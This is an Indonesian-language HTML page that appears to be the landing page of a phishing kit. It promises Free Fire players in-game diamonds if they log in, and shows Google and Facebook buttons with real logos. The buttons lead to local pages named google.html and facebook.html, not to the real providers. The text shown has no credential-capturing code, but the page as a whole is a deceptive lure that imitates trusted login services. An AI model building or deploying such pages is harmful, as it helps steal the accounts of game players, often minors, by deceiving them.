<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Required</title>
    <style>
        /* CSS THEME PUTIH DENGAN AKSEN HITAM */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #ffffff;
            color: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-card {
            background-color: #ffffff;
            width: 90%;
            max-width: 400px;
            padding: 35px;
            border-radius: 15px;
            border: 1px solid #eeeeee;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
        }

        .login-card h1 {
            font-size: 24px;
            color: #000000; 
            text-transform: uppercase;
            margin-bottom: 10px;
            font-weight: 900;
            letter-spacing: 1px;
        }

        .login-card p {
            font-size: 14px;
            color: #666;
            margin-bottom: 30px;
        }

        .login-options {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .btn-login {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 14px;
            border-radius: 8px;
            text-decoration: none;
            font-weight: bold;
            font-size: 15px;
            transition: 0.3s;
            border: 1px solid #ddd;
            cursor: pointer;
        }

        .google {
            background-color: #ffffff;
            color: #333;
        }

        .google:hover {
            background-color: #f8f8f8;
            border-color: #bbb;
        }

        .facebook {
            background-color: #1877F2;
            color: #fff;
            border: none;
        }

        .facebook:hover {
            background-color: #166fe5;
            box-shadow: 0 4px 12px rgba(24, 119, 242, 0.2);
        }

        .icon {
            width: 18px;
            margin-right: 12px;
        }

        .footer-text {
            margin-top: 25px;
            font-size: 11px;
            color: #bbb;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <h1>LOGIN REQUIRED</h1>
        <p>Silakan masuk ke akun Free Fire anda agar diamond masuk</p>

        <div class="login-options">
            <div class="btn-login google" onclick="handleLogin('google')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" alt="Google" class="icon">
                Login dengan Google
            </div>

            <div class="btn-login facebook" onclick="handleLogin('facebook')">
                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b9/2023_Facebook_icon.svg" alt="Facebook" class="icon">
                Login dengan Facebook
            </div>
        </div>

        <div class="footer-text">
            Silahkan login
        </div>
    </div>

    <script>
        function handleLogin(provider) {
            if (provider === 'google') {
                // Alihkan ke google.html
                window.location.href = "google.html";
            } else if (provider === 'facebook') {
                // Alihkan ke facebook.html
                window.location.href = "facebook.html";
            }
        }
    </script>

</body>
</html>
